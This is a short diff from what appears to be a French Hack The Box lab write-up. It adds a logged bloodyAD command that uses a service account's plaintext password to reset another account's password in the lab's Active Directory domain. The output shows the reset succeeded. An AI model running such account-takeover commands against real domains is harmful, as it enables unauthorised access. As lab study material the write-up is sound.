@@ -222,3 +222,9 @@ Une escalade AD classique n'est pas possible.\
 Il faudra exploiter un **service**, une **application**, ou
 **monitoring_svc**.
 
+```
+[Nov 14, 2025 - 19:07:38 (CET)] exegol-htb-vpn /workspace # bloodyAD --host 10.10.11.93 -u WEB_SVC -p 'dksehdgh712!@#' -d nanocorp.htb set password "monitoring_svc" "Password1234"
+
+[+] Password changed successfully!
+
+```
